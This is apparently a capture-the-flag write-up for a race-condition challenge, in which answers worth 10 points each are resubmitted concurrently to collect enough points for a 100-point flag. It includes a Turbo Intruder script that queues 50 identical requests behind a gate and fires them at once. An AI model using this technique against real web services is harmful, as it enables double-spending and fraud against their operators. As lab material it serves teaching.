This challenge was based on race condition. You are required to answer 3 questions which will give you 10 point each. You have to buy a flag whose value is 100 point.

![image](https://user-images.githubusercontent.com/19681324/158107862-cf51445b-b6c6-4872-849a-8f1eebbca6ee.png)

So we can use turbo intruder here to exploit this race condition. 

Each challenge will give you 10 points

![image](https://user-images.githubusercontent.com/19681324/158210423-283d2c58-dfb4-481e-a83b-bfcdebdf7fb5.png)

If you submit the answer and then try to exploit it with turbo intruder it won't work. Either submit the answer and intercept it with burp then exploit using turbo intruder
or start a fresh session and just replace the cookies

I used the below script for turbo intruder, can be easily found on portswigger github repo

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for i in range(50):
        engine.queue(target.req,  target.baseInput, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=5)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    #if req.status != 404:
    table.add(req)
    ```
    


